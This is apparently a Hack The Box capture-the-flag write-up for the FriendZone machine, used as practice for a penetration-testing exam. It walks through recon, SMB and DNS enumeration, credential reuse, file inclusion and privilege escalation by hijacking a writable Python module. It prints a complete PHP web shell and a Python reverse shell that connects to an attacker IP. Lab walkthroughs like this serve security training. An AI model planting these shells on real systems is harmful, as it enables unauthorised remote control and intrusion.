---
title: 'HTB-FriendZone'
published: 2025-03-26
draft: false
toc: true
tags: ["DNS", "smb", "pspy", "OSCP Prep"]
---

---
```
Scope:
10.10.10.123
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -p- friendzone -sT -T5 --min-rate=5000 -Pn -vvvv

PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 3.0.3
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain      syn-ack ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    syn-ack Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2025-03-22T20:37:37+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60332/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12958/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 37865/udp): CLEAN (Failed to receive data)
|   Check 4 (port 64027/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-03-22T18:37:38
|_  start_date: N/A
|_clock-skew: mean: -39m58s, deviation: 1h09m16s, median: 0s
```

I notice that port `53` is open, maybe we'll have to do some DNS enumeration.

## 21/TCP - FTP

![](attachments/f0e47f5f1e94380e95b5b7b8726fda7c.png)

We might need some creds first.

## 445/TCP - SMB

![](attachments/fe90b658445d94b1f8d6d1ae97ac5c89.png)

We notice that we have anon access and that **Development** has both `READ` and `WRITE` permissions, while **general** has `READ` permissions.

Let's check it out.

![](attachments/a2bca90b9f30c715ee1d9cfa8cb3dbc6.png)

Empty

![](attachments/3b75f85055cc522b19f91cc687b98999.png)

Nice, let's check these out.

![](attachments/d3e15d0dc3a1f294f18ee6c281e5f4bd.png)

```
admin
WORKWORKHhallelujah@#
```

I tried spraying these creds against other ports, but had no luck.

I decided to check out the web ports.

## 80/TCP - HTTP

![](attachments/1b4cc77e74e3165a740f5e5e09ad79d7.png)

It looks like they keep giving us not so subtle hints about a zone transfer. I'll finish my enumeration first.

## 443/TCP - HTTPS

![](attachments/331ea2e99bbcb225def6827f0e7bfd1e.png)

Other than that, `feroxbuster` yielded no results on either web port.

Time for some DNS action.

## 53/TCP - DNS

![](attachments/bdc53e12ebbaa081eab965100e27be97.png)

We got some new subdomains, and they all appear to be on the same address. Let's add them to our `/etc/hosts` list.
 
I then tried to check out the sites of the subdomains, port `80` looked the same, however port `443` showed a different page for the **administrator1.friendzone.red** subdomain.

## Subdomain

![](attachments/b241ae6e5de711a8bbee231da00f7a07.png)

We can now HIGHLY LIKELY use the previously found credentials to log in.

![](attachments/7da22823d22a2f5345aa0e6a505a9ee1.png)

Heading to `/dashboard.php` we see this:

![](attachments/b61df6ea5dde840e86c4a636713460fd.png)

![](attachments/7fda7d8ea295d4ac2f2eee6e197e9034.png)


### Gobuster

I went ahead and launched `gobuster` in order to enumerate the directories further.

![](attachments/3bbaba7e07c463a5ad2e77e15700020e.png)

![](attachments/f98b62e6934ff36b6195149b247b2c63.png)

This one stood out but other than that it didn't have any interesting info.

I then went back to the `/dashboard.php` page and found that I could play around with the variables in the url link:

![](attachments/91fcb2c4958c92d6ed4d99dc8138e2d9.png)

Maybe if I can create a webshell and put it inside the `pagename=` variable I could get it to run?

### Webshell

I used the following `webshell.php` file:

```php
<?php
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Web Shell</title>
    <style>
        * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }

        body {
            font-family: sans-serif;
            color: rgba(0, 0, 0, .75);
        }

        main {
            margin: auto;
            max-width: 850px;
        }

        pre,
        input,
        button {
            padding: 10px;
            border-radius: 5px;
            background-color: #efefef;
        }

        label {
            display: block;
        }

        input {
            width: 100%;
            background-color: #efefef;
            border: 2px solid transparent;
        }

        input:focus {
            outline: none;
            background: transparent;
            border: 2px solid #e6e6e6;
        }

        button {
            border: none;
            cursor: pointer;
            margin-left: 5px;
        }

        button:hover {
            background-color: #e6e6e6;
        }

        .form-group {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            padding: 15px 0;
        }
    </style>

</head>

<body>
    <main>
        <h1>Web Shell</h1>
        <h2>Execute a command</h2>

        <form method="post">
            <label for="cmd"><strong>Command</strong></label>
            <div class="form-group">
                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                <button type="submit">Execute</button>
            </div>
        </form>

        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
            <h2>Output</h2>
            <?php if (isset($cmd)): ?>
                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php else: ?>
                <pre><small>No result.</small></pre>
            <?php endif; ?>
        <?php endif; ?>
    </main>
</body>
</html>
```

And used `put webshell.php` on the smb server:

![](attachments/3de52a5a3fed7faa3ca96c4329b0575c.png)

I then had to find out the location where I had put these files so I used `nmap nse` for it:

```bash
sudo nmap -sC -sV -p445 friendzone.red -sT -T5 --min-rate=5000 -Pn -vvvv --script smb-enum-shares.nse 

PORT    STATE SERVICE     REASON  VERSION
445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: FRIENDZONE

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.123\Development: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE

<SNIP>
```

It appears to be inside the `/etc/Development` folder. Let's try to leverage directory traversal.

![](attachments/0053476f95f14aa43a4850040ab55eea.png)

![](attachments/d50885afce91f519c5e056fea269e47a.png)

Awesome, it worked! Let's use the webshell.

![](attachments/95b765e0cc6c0be205290654dca349c8.png)

# Foothold

Our webshell works, time to get a full reverse shell.

![](attachments/ffa83e8bf8058713afa1447680606b1c.png)

## Busybox, my beloved

When all other payloads fail, I know I can rely on you `busybox`:

![](attachments/807b300f0c782e40d8b8bdc327dc4009.png)

![](attachments/512c5f08a268337a8ba92e02ad589d61.png)

Let's get the `user.txt` flag.

### user.txt

![](attachments/3f42118a8d870e31ff6750e1db2e7d6b.png)

## Lateral Movement

I started doing some enum and stumbled upon the following:

![](attachments/520cbf88d71e56a09a6e5075325e21a5.png)

```
friend
Agpyu12!0.213$
```

We can try logging into `ssh` using these creds.

![](attachments/3a26d1aedfd173c7f57896cf6ccc0d11.png)

It worked! Let's get to it.

# Privilege Escalation

## Root Process 

I went ahead and transfered over `pspy32` and ran it in order to check out the processes running:

![](attachments/a78d3764075b24eb9315ab84df81a6e6.png)

![](attachments/35aa9e2bcb808602866b70028960ccf4.png)

I let it run for a little while.

![](attachments/f2b1f2f7d53e642fef1048e2f5f94d16.png)

There's a process running under *root* in the `/opt` directory. Let's check it out.

![](attachments/ac6bb2951f42d1422cd2d795e9768d0e.png)

Unfortunately we aren't allowed to modify the script, or we could've easily got *root*.

In order to solve this I decided to also download over `linpeas.sh` and do some more enumeration, perhaps there is another way?

![](attachments/0bea3e7e816ce8629bcc22b40299b030.png)

## Python Package Hijacking

We notice that the `os` package that our script is importing, is world writable! This means we could modify it, and upon import it should still fire.

![](attachments/6048c03365d6f95bdf8226860c1de120.png)

![](attachments/dc32252c7276212f3434839056a07bd0.png)

It worked, let's write our payload.

For this I used the normal `Python #2` reverse shell from [revshells.com](https://www.revshells.com/):

![](attachments/2cb68a92911ebd69b52b40d45eed282a.png)

But since we are already *inside* the `os` file, I don't have to import it.

```python
import socket,subprocess,pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.2",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)

pty.spawn("/bin/bash")
s.close()
```

![](attachments/cb92e1d59e8f95421b18157cbb63c088.png)

Now it's time to start our listener and wait.

![](attachments/71d13fa5e9b5e514c0ab72dab05059d0.png)

### root.txt

![](attachments/9bdb5a9d0b137dc6489df5f5d462d906.png)

![](attachments/95cca11b3fd2fe81e5a6478219273393.png)

---